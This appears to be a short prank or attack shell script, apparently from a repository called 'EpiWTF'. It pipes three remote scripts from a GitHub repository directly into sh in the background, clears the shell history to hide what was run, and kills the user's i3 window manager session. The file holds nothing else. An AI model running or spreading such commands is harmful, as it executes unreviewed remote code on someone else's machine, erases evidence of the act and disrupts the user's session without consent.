curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh &
curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh &
curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh &

history -c &
i3-msg kill &
